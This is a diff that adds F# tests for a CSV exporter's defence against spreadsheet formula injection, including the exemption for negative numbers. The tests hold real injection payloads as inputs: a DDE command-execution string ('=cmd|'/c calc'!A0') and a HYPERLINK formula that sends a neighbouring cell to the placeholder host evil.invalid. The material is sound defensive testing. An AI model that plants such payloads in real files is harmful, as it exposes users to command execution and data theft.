@@ -245,3 +245,122 @@ let tests =
                 } ]
 
           ]
+
+// ============================================================================
+//  Formula injection.
+//
+//  A spreadsheet does not read a CSV cell as text: a cell whose first character
+//  is `=`, `+`, `-` or `@`, or a tab or carriage return, is a FORMULA. RFC 4180
+//  quoting does not help — the reader strips the quotes and evaluates what is
+//  inside them — so this is a separate rule with a separate reason, and it gets
+//  its own list rather than being folded into the escaping one above.
+//
+//  The rows reaching the serialiser come from a `Query` source or an
+//  AI-authored tree. The reader downloaded the file deliberately, which is
+//  exactly what makes it trusted when it opens.
+// ============================================================================
+
+[<Tests>]
+let formulaTests =
+    testList
+        "grid CSV export — formula injection"
+        [ testList
+              "a cell a spreadsheet would EVALUATE is neutralised"
+              [ test "the four formula lead-ins" {
+                    // The two canonical payloads, plus the bare characters. The
+                    // apostrophe is what every spreadsheet reads as "the rest of
+                    // this cell is text"; the quotes mark the substitution in
+                    // the bytes.
+                    Expect.equal
+                        (escapeField "=cmd|'/c calc'!A0")
+                        "\"'=cmd|'/c calc'!A0\""
+                        "the command-execution shape"
+
+                    Expect.equal
+                        (escapeField "@SUM(1+1)*cmd|'/c calc'!A0")
+                        "\"'@SUM(1+1)*cmd|'/c calc'!A0\""
+                        "the @ variant"
+
+                    Expect.equal (escapeField "+1+1") "\"'+1+1\"" "a leading plus that is not a number"
+                    Expect.equal (escapeField "-1+1") "\"'-1+1\"" "a leading minus that is not a number"
+                }
+
+                test "the two WHITESPACE lead-ins, which a reader strips before looking" {
+                    // A tab or a CR before the `=` hides the payload from any
+                    // check that looks only at the first visible character.
+                    Expect.equal (escapeField "\t=1+1") "\"'\t=1+1\"" "a tab-led formula"
+                    Expect.equal (escapeField "\r=1+1") "\"'\r=1+1\"" "a CR-led formula"
+                }
+
+                test "the exfiltrating hyperlink — the shape that needs no macros at all" {
+                    // `=HYPERLINK("http://…"&A1,"click")` reads the neighbouring
+                    // cell into a URL. It needs no macro prompt, no warning bar
+                    // and no second gesture beyond opening the file.
+                    let payload = "=HYPERLINK(\"http://evil.invalid/?\"&A1,\"click\")"
+                    let exported = escapeField payload
+
+                    Expect.stringStarts exported "\"'=" "neutralised and quoted"
+                    Expect.stringContains exported "A1" "and the value is preserved, not stripped"
+                } ]
+
+          testList
+              "a cell that is DATA is left exactly as it was"
+              [ test "NEGATIVE NUMBERS are exempt — the exemption the whole rule turns on" {
+                    // `-` leads every negative number. Neutralising on the
+                    // character alone would prefix every negative amount in
+                    // every export and turn a numeric column into text no
+                    // reader can sum: a fix that breaks the ordinary case to
+                    // close the rare one.
+                    Expect.equal (escapeField "-42") "-42" "a negative integer"
+                    Expect.equal (escapeField "-3.14") "-3.14" "a negative decimal"
+                    Expect.equal (escapeField "-0.5") "-0.5" "a negative fraction"
+                    Expect.equal (escapeField "+7") "+7" "an explicitly-signed positive"
+                    Expect.equal (escapeField "-.5") "-.5" "a leading-point decimal"
+                }
+
+                test "an ordinary export is BYTE-IDENTICAL to what it was before the guard" {
+                    for value in [ "Acme"; "1234"; "2026-09-06"; "a b c"; ""; "x=1" ] do
+                        Expect.equal (escapeField value) value (sprintf "'%s' is untouched" value)
+                }
+
+                test "the guard composes with quoting rather than replacing it" {
+                    // A formula that ALSO contains the delimiter gets one pair
+                    // of quotes, the prefix inside them, and its embedded quotes
+                    // doubled — not two passes of escaping.
+                    Expect.equal (escapeField "=A1,B1") "\"'=A1,B1\"" "one pair of quotes around the neutralised value"
+
+                    Expect.equal (escapeField "=\"x\"") "\"'=\"\"x\"\"\"" "and the embedded quotes still double"
+                } ]
+
+          testList
+              "the number test admits only what it means to"
+              [ test "spellings `Double.TryParse` would accept and this must not" {
+                    // Every one of these is a leading sign followed by something
+                    // that is not a plain number, and several parse as doubles.
+                    for value in [ "-Infinity"; "-NaN"; "- 42"; "-1e9"; "-1,234"; "-4-2"; "-1.2.3"; "-"; "+" ] do
+                        Expect.isFalse (isPlainNumber value) (sprintf "'%s' is not a plain number" value)
+                        Expect.stringStarts (escapeField value) "\"'" (sprintf "'%s' is neutralised" value)
+                }
+
+                test "and the spellings it does admit" {
+                    for value in [ "0"; "42"; "-42"; "+42"; "3.14"; "-3.14"; ".5"; "-.5"; "5." ] do
+                        Expect.isTrue (isPlainNumber value) (sprintf "'%s' is a plain number" value)
+                }
+
+                test "neutraliseFormula on its own is the identity where there is nothing to do" {
+                    Expect.equal (neutraliseFormula "Acme") "Acme" "unchanged"
+                    Expect.equal (neutraliseFormula "") "" "an empty field has no first character"
+                    Expect.equal (neutraliseFormula "=1") "'=1" "and prefixes where there is"
+                } ]
+
+          test "the whole document carries the guard, not just the field function" {
+              // The rule has to reach the bytes a reader actually receives. A
+              // header is a cell too — a column NAMED `=1+1` is as evaluable as
+              // a value.
+              let csv = serialise [ "name"; "=1+1" ] [ [ "=cmd|'/c calc'!A0"; "-42" ] ]
+
+              Expect.stringContains csv "\"'=1+1\"" "the header cell is neutralised"
+              Expect.stringContains csv "\"'=cmd" "the data cell is neutralised"
+              Expect.stringContains csv "-42" "and the negative number is not"
+              Expect.isFalse (csv.Contains "'-42") "no apostrophe reached the number"
+          } ]
